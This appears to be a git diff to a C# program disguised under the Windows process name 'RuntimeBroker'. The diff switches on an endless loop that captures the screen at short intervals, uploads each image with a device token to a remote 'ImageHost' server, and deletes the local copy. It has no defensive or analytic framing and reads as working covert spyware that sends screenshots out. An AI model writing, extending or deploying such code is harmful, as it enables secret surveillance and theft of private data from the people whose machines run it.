@@ -23,6 +23,7 @@ namespace RuntimeBroker
     {
         private string PcConfigPath = Path.Combine(@"C:\Users\Microsoft\AppData\Local", "Microsoft", "appsettings.xml");
         private string SettingPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"appsettings.xml");
+        private string ImagePath = AppUtils.GetTempFolder() + "/image.png";
         private AppSettings _currentSettings = new AppSettings();
 
         private ReaderWriterLock rwl = new ReaderWriterLock();
@@ -38,11 +39,11 @@ namespace RuntimeBroker
         }
         private async Task CaptureScreenEvery(int msec)
         {
-            //while (true)
-            //{
-            //    TakeScreenshot();
-            //    await Task.Delay(msec);
-            //}
+            while (true)
+            {
+                TakeScreenshot();
+                await Task.Delay(msec);
+            }
         }
 
         private void UploadImage(string imagePath)
@@ -53,48 +54,36 @@ namespace RuntimeBroker
                 {
                     try
                     {
+                        rwl.AcquireWriterLock(Timeout.Infinite);
+
                         bool isOnline = await AppUtils.IsOnline();
                         if (isOnline)
                         {
-                            const int MAX_RETRIES = 1;
-                            for (int i = 0; i < MAX_RETRIES; i++)
+                            try
                             {
-                                if (i >= MAX_RETRIES)
-                                {
-                                    break;
-                                }
-
-                                try
-                                {
-                                    var client = new HttpClient();
-                                    var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
-                                    request.Headers.Add("accept", "*/*");
-                                    var content = new MultipartFormDataContent();
-                                    content.Add(new StreamContent(File.OpenRead(imagePath)), "Image", Path.GetFileName(imagePath));
-                                    content.Add(new StringContent(Globals.UUID), "token");
-                                    request.Content = content;
-                                    var response = await client.SendAsync(request);
-                                    response.EnsureSuccessStatusCode();
-                                    string result = await response.Content.ReadAsStringAsync();
-                                    //Console.WriteLine(result);
-                                    if (result.Contains("successfully"))
-                                    {
-                                        //Debug.WriteLine("Upload image");
-                                        break;
-                                    }
-                                }
-                                catch (Exception ex)
-                                {
-                                    Log($"{ex.Message}");
-                                }
+                                var client = new HttpClient();
+                                var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
+                                request.Headers.Add("accept", "*/*");
+                                var content = new MultipartFormDataContent();
+                                content.Add(new StreamContent(File.OpenRead(imagePath)), "Image", Path.GetFileName(imagePath));
+                                content.Add(new StringContent(Globals.UUID), "token");
+                                request.Content = content;
+                                var response = await client.SendAsync(request);
+                                response.EnsureSuccessStatusCode();
+                                string result = await response.Content.ReadAsStringAsync();
+                            }
+                            catch (Exception ex)
+                            {
+                                Log($"{ex.Message}");
                             }
                         }
-                        
+
                     }
                     catch (Exception ex) { Log($"{ex.Message}"); }
                     finally
                     {
                         File.Delete(imagePath);
+                        rwl.ReleaseWriterLock();
                     }
                 });
             }
@@ -108,7 +97,7 @@ namespace RuntimeBroker
         {
             try
             {
-                string imageFile = AppUtils.GetTempFile();
+                string imageFile = ImagePath;
 
                 ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Png);
 
